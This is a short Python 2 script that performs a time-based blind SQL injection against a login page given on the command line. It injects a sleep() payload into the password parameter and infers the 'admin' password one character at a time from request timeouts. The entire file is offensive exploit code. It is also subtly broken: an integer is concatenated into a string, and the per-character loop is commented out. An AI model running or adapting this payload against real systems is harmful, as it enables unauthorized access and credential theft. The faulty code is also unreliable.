#!/usr/bin/python

import requests
import sys

characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

url = sys.argv[1]

login = 'admin'
#password_length = 41
sqlSleepTime = 5
requestTimeOut = 1

res = requests.get(url)
if res.status_code != requests.codes.ok:
        raise ValueError('Sorry! We cannot connect the site...')
else:
        print 'Connection OK! We can go now...'

def blindInjection ():
    foundChars = ''
    #for i in range(password_length):
    for c in characters:
        try:
            blindSql = '?username=' + login + '&password=' +foundChars+str(c)+'%",sleep('+sqlSleepTime+'),null)"'
            res = requests.get(url + blindSql, timeout=requestTimeOut)
        except requests.exceptions.Timeout:
            foundChars += str(c)
            print 'Found chars in password: ' + foundChars
            break
#Start show...
blindInjection()
